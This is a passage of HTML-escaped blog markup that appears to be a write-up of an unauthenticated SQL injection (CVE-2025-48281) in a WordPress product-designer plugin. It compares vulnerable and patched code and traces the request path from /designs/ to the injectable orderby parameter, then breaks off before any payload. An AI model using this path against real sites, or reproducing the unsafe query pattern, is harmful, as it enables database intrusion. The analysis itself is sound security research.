2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;MyStyle Custom Product Designer&lt;/strong&gt;: v3.21.1 (vulnerable) and v3.21.2 (patched)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any tool that can compare two versions to see differences&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Activated WooCommerce plugin&lt;/strong&gt;: WooCommerce must be active before installing the MyStyle plugin because some functions from WooCommerce are used.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The root cause is that the application directly injects data from a &lt;strong&gt;GET&lt;/strong&gt; request into an SQL query without proper validation/control.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare the vulnerable and patched versions.&#xA;A clear difference exists in the file &lt;strong&gt;includes/entities/class-mystyle-designmanager.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_designs(&#xA;    $per_page = 250,&#xA;    $page_number = 1,&#xA;    WP_User $user = null&#xA;) {&#xA;    global $wpdb;&#xA;&#xA;    // Add security WHERE clause.&#xA;    $where = self::get_security_where_clause( &amp;#39;WHERE&amp;#39;, $user );&#xA;&#xA;    if ( ! empty( $_GET[&amp;#39;orderby&amp;#39;] ) ) {&#xA;        $order  = &amp;#39; ORDER BY &amp;#39; . sanitize_text_field( wp_unslash( $_GET[&amp;#39;orderby&amp;#39;] ) );&#xA;        $order .= ! empty( $_GET[&amp;#39;order&amp;#39;] ) ? &amp;#39; &amp;#39; . sanitize_text_field( wp_unslash( $_GET[&amp;#39;order&amp;#39;] ) ) : &amp;#39; ASC&amp;#39;;&#xA;    } else {&#xA;        $order = &amp;#39; ORDER BY ms_design_id DESC&amp;#39;;&#xA;    }&#xA;   &#xA;    $results = $wpdb-&amp;gt;get_results(&#xA;        $wpdb-&amp;gt;prepare(&#xA;            &amp;#39;SELECT * &amp;#39;&#xA;            . &amp;#34;FROM {$wpdb-&amp;gt;prefix}mystyle_designs &amp;#34;&#xA;            . $where&#xA;            . $order&#xA;            . &amp;#39; LIMIT %d&#xA;            OFFSET %d&amp;#39;,&#xA;            array(&#xA;                $per_page,&#xA;                ( $page_number - 1 ) * $per_page,&#xA;            )&#xA;        ),&#xA;        &amp;#39;OBJECT&amp;#39;&#xA;    );&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Data from &lt;code&gt;$_GET[&#39;orderby&#39;]&lt;/code&gt; is injected directly into the SQL query without proper validation. Using only &lt;code&gt;sanitize_text_field()&lt;/code&gt; and &lt;code&gt;wp_unslash()&lt;/code&gt; only removes or escapes characters and does &lt;strong&gt;not&lt;/strong&gt; guarantee safety. Therefore, SQLi is possible.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_designs(&#xA;    $per_page = 250,&#xA;    $page_number = 1,&#xA;    WP_User $user = null&#xA;) {&#xA;    global $wpdb;&#xA;&#xA;    // Add security WHERE clause.&#xA;    $where = self::get_security_where_clause( &amp;#39;WHERE&amp;#39;, $user );&#xA;&#xA;       if ( ! empty( $_GET[&amp;#39;orderby&amp;#39;] ) ) {&#xA;        $orderby = sanitize_text_field( wp_unslash( $_GET[&amp;#39;orderby&amp;#39;] ) );&#xA;        $order   = ! empty( $_GET[&amp;#39;order&amp;#39;] ) ? sanitize_text_field( wp_unslash( $_GET[&amp;#39;order&amp;#39;] ) ) : &amp;#39;ASC&amp;#39;;&#xA;        &#xA;        // Validate order direction to prevent SQL injection.&#xA;        $allowed_orderby = array(&#xA;            &amp;#39;ms_design_id&amp;#39;,&#xA;            &amp;#39;ms_title&amp;#39;,&#xA;            &amp;#39;ms_access&amp;#39;,&#xA;            &amp;#39;ms_email&amp;#39;,&#xA;            &amp;#39;ms_date_created&amp;#39;,&#xA;            &amp;#39;ms_date_modified&amp;#39;,&#xA;        );&#xA;        $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : &amp;#39;ms_design_id&amp;#39;;&#xA;&#xA;        $order = in_array( strtoupper( $order ), array( &amp;#39;ASC&amp;#39;, &amp;#39;DESC&amp;#39; ), true ) ? $order : &amp;#39;ASC&amp;#39;;&#xA;        &#xA;        $order = &amp;#39; ORDER BY &amp;#39; . $orderby . &amp;#39; &amp;#39; . $order;&#xA;    } else {&#xA;        $order = &amp;#39; ORDER BY ms_design_id DESC&amp;#39;;&#xA;    }&#xA;&#xA;    $results = $wpdb-&amp;gt;get_results(&#xA;        $wpdb-&amp;gt;prepare(&#xA;            &amp;#39;SELECT * &amp;#39;&#xA;            . &amp;#34;FROM {$wpdb-&amp;gt;prefix}mystyle_designs &amp;#34;&#xA;            . $where&#xA;            . $order&#xA;            . &amp;#39; LIMIT %d&#xA;            OFFSET %d&amp;#39;,&#xA;            array(&#xA;                $per_page,&#xA;                ( $page_number - 1 ) * $per_page,&#xA;            )&#xA;        ),&#xA;        &amp;#39;OBJECT&amp;#39;&#xA;    );&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch implements a whitelist (&lt;code&gt;$allowed_orderby&lt;/code&gt;) that explicitly defines allowable columns for ordering. If the &lt;code&gt;orderby&lt;/code&gt; value is not in the allowed list, it is replaced with the default &lt;code&gt;&#39;ms_design_id&#39;&lt;/code&gt; — preventing injection of malicious payloads.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/patch_diff.png&#34; title=&#34;Patch diff&#34; data-thumbnail=&#34;/posts/2025-09-27-cve-2025-48281/patch_diff.png&#34; data-sub-html=&#34;&lt;h2&gt;patch diff&lt;/h2&gt;&lt;p&gt;Patch diff&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-27-cve-2025-48281/patch_diff.png&#39; alt=&#34;patch diff&#34; height=&#34;262&#34; width=&#34;940&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch diff&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The vulnerability is in the &lt;code&gt;get_designs&lt;/code&gt; function of the &lt;code&gt;MyStyle_DesignManager&lt;/code&gt; class (file &lt;strong&gt;includes/entities/class-mystyle-designmanager.php&lt;/strong&gt;). To find where it is called, search for &lt;code&gt;get_designs&lt;/code&gt; within the plugin folder.&lt;/p&gt;&#xA;&lt;p&gt;👉 &lt;code&gt;get_designs&lt;/code&gt; is called from &lt;code&gt;get_items&lt;/code&gt;, &lt;code&gt;init_index_request&lt;/code&gt; and some test functions (not relevant).&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_1.png&#34; title=&#34;Search get_designs usage&#34; data-thumbnail=&#34;/posts/2025-09-27-cve-2025-48281/search_1.png&#34; data-sub-html=&#34;&lt;h2&gt;Search 1&lt;/h2&gt;&lt;p&gt;Search get_designs usage&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_1.png&#39; alt=&#34;Search 1&#34; height=&#34;535&#34; width=&#34;872&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search get_designs usage&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Because this is an &lt;strong&gt;unauthenticated&lt;/strong&gt; vulnerability, we must identify which function can be invoked without authentication.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;get_items-function&#34;&gt;&lt;span&gt;get_items() Function&lt;/span&gt;&#xA;  &lt;a href=&#34;#get_items-function&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;code&gt;get_items&lt;/code&gt; is in the &lt;code&gt;MyStyle_Wp_Rest_Api_Design_Controller&lt;/code&gt; class (file &lt;strong&gt;includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php&lt;/strong&gt;).&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_2.png&#34; title=&#34;Search get_items&#34; data-thumbnail=&#34;/posts/2025-09-27-cve-2025-48281/search_2.png&#34; data-sub-html=&#34;&lt;h2&gt;search 2&lt;/h2&gt;&lt;p&gt;Search get_items&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_2.png&#39; alt=&#34;search 2&#34; height=&#34;483&#34; width=&#34;1503&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search get_items&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The code before calling &lt;code&gt;get_designs&lt;/code&gt; doesn’t handle authentication, so we must check the permission callback used by the REST route. &lt;code&gt;get_items&lt;/code&gt; is registered as the callback for a REST API route using &lt;code&gt;register_rest_route()&lt;/code&gt; in WordPress.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;    $version   = &amp;#39;2&amp;#39;;&#xA;    $vendor    = &amp;#39;wc-mystyle&amp;#39;;&#xA;    $namespace = $vendor . &amp;#39;/v&amp;#39; . $version;&#xA;    $base      = &amp;#39;designs&amp;#39;;&#xA;    register_rest_route(&#xA;        $namespace, &amp;#39;/&amp;#39; . $base, array(&#xA;            array(&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::READABLE, // GET&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;get_items&amp;#39; ),&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; array( $this, &amp;#39;get_items_permissions_check&amp;#39; ),&#xA;                &amp;#39;args&amp;#39;                =&amp;gt; array(),&#xA;            )&#xA;        )&#xA;    )&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However, before the callback is invoked, the &lt;code&gt;get_items_permissions_check&lt;/code&gt; function runs — we need to know whether an anonymous user can call this API. Search for &lt;code&gt;get_items_permissions_check&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_3.png&#34; title=&#34;Search get_items_permissions_check&#34; data-thumbnail=&#34;/posts/2025-09-27-cve-2025-48281/search_3.png&#34; data-sub-html=&#34;&lt;h2&gt;search 3&lt;/h2&gt;&lt;p&gt;Search get_items_permissions_check&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_3.png&#39; alt=&#34;search 3&#34; height=&#34;289&#34; width=&#34;1483&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search get_items_permissions_check&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 &lt;code&gt;get_items_permissions_check&lt;/code&gt; calls &lt;code&gt;wc_rest_check_manager_permissions&lt;/code&gt; to verify permissions with &lt;code&gt;$object = &#39;settings&#39;&lt;/code&gt;. Because &lt;code&gt;wc_rest_check_manager_permissions&lt;/code&gt; is defined in the WooCommerce plugin (not in this plugin), we need to inspect its behavior.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_4.png&#34; title=&#34;Search wc_rest_check_manager_permissions&#34; data-thumbnail=&#34;/posts/2025-09-27-cve-2025-48281/search_4.png&#34; data-sub-html=&#34;&lt;h2&gt;search 4&lt;/h2&gt;&lt;p&gt;Search wc_rest_check_manager_permissions&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_4.png&#39; alt=&#34;search 4&#34; height=&#34;384&#34; width=&#34;1409&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search wc_rest_check_manager_permissions&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wc_rest_check_manager_permissions&lt;/code&gt; is defined in the &lt;strong&gt;WooCommerce&lt;/strong&gt; plugin.&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;settings&lt;/code&gt; mapping leads to &lt;code&gt;manage_woocommerce&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;It calls &lt;code&gt;current_user_can( &#39;manage_woocommerce&#39; )&lt;/code&gt; to check user capability =&amp;gt; only admin (or users with &lt;code&gt;manage_woocommerce&lt;/code&gt; capability).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Therefore we cannot exploit via &lt;code&gt;get_items&lt;/code&gt; =&amp;gt; we should try to exploit via &lt;code&gt;init_index_request&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;init_index_request-function&#34;&gt;&lt;span&gt;init_index_request() Function&lt;/span&gt;&#xA;  &lt;a href=&#34;#init_index_request-function&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;code&gt;init_index_request&lt;/code&gt; is in the &lt;code&gt;MyStyle_Design_Profile_Page&lt;/code&gt; class (file &lt;strong&gt;includes/pages/class-mystyle-design-profile-page.php&lt;/strong&gt;).&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_5.png&#34; title=&#34;Search init_index_request&#34; data-thumbnail=&#34;/posts/2025-09-27-cve-2025-48281/search_5.png&#34; data-sub-html=&#34;&lt;h2&gt;search 5&lt;/h2&gt;&lt;p&gt;Search init_index_request&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_5.png&#39; alt=&#34;search 5&#34; height=&#34;899&#34; width=&#34;1399&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search init_index_request&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The code prior to calling &lt;code&gt;get_designs&lt;/code&gt; doesn’t involve authentication, so we move on.&#xA;&lt;code&gt;init_index_request&lt;/code&gt; is invoked by the &lt;code&gt;init&lt;/code&gt; method in the same class.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function init() {&#xA;    // Check if the current page is /designs&#xA;    if ( ! self::is_current_post() ) {&#xA;        return;&#xA;    }&#xA;&#xA;    // other logic&#xA;    $design_id = self::get_design_id_from_url();&#xA;&#xA;    // Only runs when the following POST variables are present =&amp;gt; not relevant&#xA;    if( isset( $_POST[&amp;#39;delete_design_nonce&amp;#39;] ) &amp;amp;&amp;amp; wp_verify_nonce( sanitize_key( $_POST[&amp;#39;delete_design_nonce&amp;#39;] ), &amp;#39;mystyle_delete_design_nonce&amp;#39; ) ) {&#xA;        &#xA;        $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ;&#xA;        if ( $design ) {&#xA;            // Check if the user is the owner of the design or an admin.&#xA;            if ( current_user_can( &amp;#39;administrator&amp;#39; ) || MyStyle_DesignManager::is_user_design_owner( $this-&amp;gt;user-&amp;gt;ID, $design_id ) ) {&#xA;                // restrict the design access to 2 (deleted).&#xA;                $design-&amp;gt;set_access( 2 );&#xA;                MyStyle_DesignManager::persist( $design );&#xA;                $this-&amp;gt;delete_design_success_message = &amp;#39;Design has been successfully deleted.&amp;#39;;&#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;    if ( false === $design_id || preg_match( &amp;#39;/page/&amp;#39;, $design_id ) ) {&#xA;        $design_profile_page-&amp;gt;init_index_request();&#xA;    } else {&#xA;        $design_profile_page-&amp;gt;init_design_request( $design_id );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For &lt;code&gt;init_index_request&lt;/code&gt; to be called, the &lt;code&gt;if&lt;/code&gt; condition must be true. We need to know what &lt;code&gt;$design_id&lt;/code&gt; is — it’s determined by &lt;code&gt;get_design_id_from_url&lt;/code&gt; which is called via &lt;code&gt;self::get_design_id_from_url&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_design_id_from_url() {&#xA;    // Try the query vars ( ex: &amp;amp;design_id=10 ).&#xA;    $design_id = get_query_var( &amp;#39;design_id&amp;#39; );&#xA;    if ( preg_match( &amp;#39;/page/&amp;#39;, $design_id ) ) {&#xA;        $design_id = false;&#xA;    } elseif ( empty( $design_id ) ) {&#xA;        // ---------- try at /designs/10. --------&#xA;        // phpcs:ignore&#xA;        $path = $_SERVER[&amp;#39;REQUEST_URI&amp;#39;];&#xA;&#xA;        // Get the design profile page&amp;#39;s WP_Post slug.&#xA;        /* @var $post \WP_Post phpcs:ignore */&#xA;        $post = get_post( self::get_id() );&#xA;        $slug = $post-&amp;gt;post_name;&#xA;&#xA;        $pattern = &amp;#39;/^.*\/&amp;#39; . $slug . &amp;#39;\/([\d]&amp;#43;)/&amp;#39;;&#xA;        if ( preg_match( $pattern, $path, $matches ) ) {&#xA;            $design_id = $matches[1];&#xA;        } else {&#xA;            $design_id = false;&#xA;        }&#xA;        // -------------------------------------&#xA;    }&#xA;&#xA;    return $design_id;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 This function reads &lt;code&gt;design_id&lt;/code&gt; from the &lt;strong&gt;URL&lt;/strong&gt;, so if you do not include it in the URL when sending a request =&amp;gt; the &lt;code&gt;if&lt;/code&gt; condition becomes true =&amp;gt; &lt;code&gt;init_index_request&lt;/code&gt; is invoked.&lt;/p&gt;&#xA;&lt;p&gt;Back in &lt;code&gt;init&lt;/code&gt;, it is called from this class’s constructor (&lt;code&gt;__construct&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct() {&#xA;    // other logic&#xA;    add_action( &amp;#39;init&amp;#39;, array( &amp;amp;$this, &amp;#39;rewrite_rules&amp;#39; ) );&#xA;    add_action( &amp;#39;template_redirect&amp;#39;, array( &amp;amp;$this, &amp;#39;init&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;init&lt;/code&gt; is registered as a callback on the &lt;code&gt;template_redirect&lt;/code&gt; hook — an action hook in WordPress that runs before the template is actually loaded and sent to the browser.&lt;/p&gt;&#xA;&lt;p&gt;Above the &lt;code&gt;template_redirect&lt;/code&gt; hook in the constructor, the &lt;code&gt;init&lt;/code&gt; hook is also registered with the callback &lt;code&gt;rewrite_rules&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rewrite_rules() {&#xA;    // Flush rewrite rules for newly created rewrites.&#xA;    flush_rewrite_rules();&#xA;&#xA;    add_rewrite_rule(&#xA;        &amp;#39;designs/([a-zA-Z0-9_-].&amp;#43;)?$&amp;#39;, // designs/{slug}&#xA;        &amp;#39;index.php?pagename=designs&amp;amp;design_id=$matches[1]&amp;#39;,&#xA;        &amp;#39;top&amp;#39;&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This adds the route &lt;code&gt;/designs/{id}&lt;/code&gt; to load the &lt;code&gt;designs&lt;/code&gt; page and pass &lt;code&gt;design_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;👉 Therefore, when accessing &lt;code&gt;/designs/&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The &lt;code&gt;rewrite_rules&lt;/code&gt; callback runs, WordPress loads &lt;code&gt;/index.php?pagename=designs&amp;amp;design_id=&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Since &lt;code&gt;design_id&lt;/code&gt; has no value, &lt;code&gt;get_design_id_from_url&lt;/code&gt; returns false =&amp;gt; the condition &lt;code&gt;false === $design_id&lt;/code&gt; becomes true so &lt;code&gt;init_index_request&lt;/code&gt; is called.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;init_index_request&lt;/code&gt; calls &lt;code&gt;get_designs&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;get_designs&lt;/code&gt; directly reads &lt;code&gt;orderby&lt;/code&gt; from the &lt;strong&gt;GET&lt;/strong&gt; request and inserts it into the SQL query.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/chart.png&#34; title=&#34;Execution Flow&#34; data-thumbnail=&#34;/posts/2025-09-27-cve-2025-48281/chart.png&#34; data-sub-html=&#34;&lt;h2&gt;Chart&lt;/h2&gt;&lt;p&gt;Execution Flow&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-27-cve-2025-48281/chart.png&#39; alt=&#34;Chart&#34; height=&#34;682&#34; width=&#34;1513&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Execution Flow&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; 